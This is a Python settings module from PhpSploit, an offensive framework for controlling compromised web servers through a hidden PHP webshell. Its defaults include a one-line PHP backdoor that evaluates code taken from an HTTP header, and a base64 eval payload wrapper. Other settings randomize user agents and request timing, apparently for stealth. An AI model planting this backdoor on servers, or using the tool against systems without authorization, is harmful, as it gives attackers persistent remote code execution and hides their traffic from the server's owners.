import os
import sys
import re
import tempfile

import core
from . import baseclass

from datatypes import ByteSize, Path, Executable, WebBrowser
from datatypes import Interval, PhpCode, Proxy, Url

DEFAULT_HTTP_USER_AGENT = "file://"+core.basedir+"data/user_agents.lst"


class Settings(baseclass.MetaDict):
    """Configuration Settings

    Instanciate a dict() like object that stores PhpSploit
    session settings.

    Behavior:
    >>> Conf = Settings()
    >>> Conf.TMPPATH # call TMPPATH item (type: RandLineBuffer)
    >>> Conf["TMPPATH"] # same as above
    >>> Conf("REQ_") # display nice REQ_* vars representation
    >>> Conf.HTTP_USER_AGENT += "IE7" # add a possible TMPPATH value (random)
    >>> Conf.HTTP_USER_AGENT = "file:///tmp/useragents.lst"

    The last example binds the var's value to the file's data.

    When a setting buffer contains multiple lines, such as in
    the case of file binds, the the var's value will be randomly
    picked from valid lines.

    """
    def __init__(self):
        """Declare default settings values"""
        super().__init__()

        # Session related
        self.TMPPATH = "%%DEFAULT%%"
        self.SAVEPATH = "%%DEFAULT%%"
        self.CACHE_SIZE = "1 MiB"

        # Tunnel link opener
        self.TARGET = None
        self.BACKDOOR = "@eval($_SERVER['HTTP_%%PASSKEY%%']);"
        self.PROXY = None
        self.PASSKEY = "phpSpl01t"

        # System tools
        self.EDITOR = "%%DEFAULT%%"
        self.BROWSER = "%%DEFAULT%%"

        # HTTP Headers
        self.HTTP_USER_AGENT = DEFAULT_HTTP_USER_AGENT

        # HTTP Requests settings
        self.REQ_DEFAULT_METHOD = "GET"
        self.REQ_HEADER_PAYLOAD = "eval(base64_decode(%%BASE64%%))"
        self.REQ_INTERVAL = "1-10"
        self.REQ_MAX_HEADERS = 100
        self.REQ_MAX_HEADER_SIZE = "4 KiB"
        self.REQ_MAX_POST_SIZE = "4 MiB"
        self.REQ_ZLIB_TRY_LIMIT = "20 MiB"

    def __setitem__(self, name, value):
        # print("bla");
        # if the set value is a RandLineBuffer obj, just do it!
        if isinstance(value, baseclass.RandLineBuffer):
            return super().__setitem__(name, value)

        name = name.replace('-', '_').upper()

        # ensure the setting name has good syntax
        if not self._isattr(name):
            raise KeyError("illegal name: '{}'".format(name))

        # ensure the setting name is allowed
        if name[5:] and name[:5] == "HTTP_":
            setter = self._set_HTTP_header
        elif hasattr(self, "_set_"+name):
            setter = getattr(self, "_set_"+name)
        else:
            raise KeyError("illegal name: '{}'".format(name))

        # extend value into RandLineBuffer() instance.

        # This fix creates a non-failing version of user agent default value
        if name == "HTTP_USER_AGENT" and name not in self.keys():
            try:
                value = baseclass.RandLineBuffer(value, setter)
            except ValueError:
                alt_file = value[7:]
                alt_buff = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
                value = baseclass.RandLineBuffer((alt_file, alt_buff), setter)
        else:
            value = baseclass.RandLineBuffer(value, setter)

        # use grandparent class (bypass parent's None feature)
        dict.__setitem__(self, name, value)

    def _isattr(self, name):
        return re.match("^[A-Z][A-Z0-9_]+$", name)

    def _set_HTTP_header(self, value):
        return str(value)

    def _set_REQ_INTERVAL(self, value):
        return Interval(value)

    def _set_TMPPATH(self, value):
        if value == "%%DEFAULT%%":
            value = tempfile.gettempdir()
        return Path(value, mode="drw")

    def _set_SAVEPATH(self, value):
        if value == "%%DEFAULT%%":
            value = tempfile.gettempdir()
        return Path(value, mode="drw")

    def _set_CACHE_SIZE(self, value):
        return ByteSize(value)

    def _set_TARGET(self, value):
        if str(value).lower() in ["", "none"]:
            return None
        return Url(value)

    def _set_BACKDOOR(self, value):
        if value.find("%%PASSKEY%%") < 0:
            raise ValueError("shall contain %%PASSKEY%% string")
        return PhpCode(value)

    def _set_PROXY(self, value):
        # if str(value).lower() in ["", "none"]:
        #     return None
        return Proxy(value)

    def _set_PASSKEY(self, value):
        value = str(value).lower()
        reserved_headers = ['host', 'accept-encoding', 'connection',
                            'user-agent', 'content-type', 'content-length']
        if not value:
            raise ValueError("can't be an empty string")
        if not re.match("^[a-zA-Z0-9_]+$", value):
            raise ValueError("only chars from set «a-Z0-9_» are allowed")
        if re.match('^zz[a-z]{2}$', value) or \
           value.replace('_', '-') in reserved_headers:
            raise ValueError("reserved header name: «{}»".format(value))
        return value

    def _set_EDITOR(self, value):
        if value == "%%DEFAULT%%":
            value = "vi"
            if "EDITOR" in os.environ:
                value = os.environ["EDITOR"]
            elif sys.platform.startswith("win"):
                value = "notepad.exe"
        return Executable(value)

    def _set_BROWSER(self, value):
        if value == "%%DEFAULT%%":
            value = ""
        return WebBrowser(value)

    def _set_REQ_DEFAULT_METHOD(self, value):
        if value.upper() not in ["GET", "POST"]:
            raise ValueError("available methods: GET/POST")
        return value.upper()

    def _set_REQ_HEADER_PAYLOAD(self, value):
        if not value.find("%%BASE64%%"):
            raise ValueError("shall contain %%BASE64%% string")
        return PhpCode(value)

    def _set_REQ_MAX_HEADERS(self, value):
        if 10 <= int(value) <= 680:
            return int(value)
        raise ValueError("must be an integer from 10 to 680")

    def _set_REQ_MAX_HEADER_SIZE(self, value):
        value = ByteSize(value)
        if 250 > value:
            raise ValueError("can't be less than 250 bytes")
        return value

    def _set_REQ_MAX_POST_SIZE(self, value):
        value = ByteSize(value)
        if 250 > value:
            raise ValueError("can't be less than 250 bytes")
        return value

    def _set_REQ_ZLIB_TRY_LIMIT(self, value):
        value = ByteSize(value)
        if value < 1:
            raise ValueError("must be a positive bytes number")
        return value
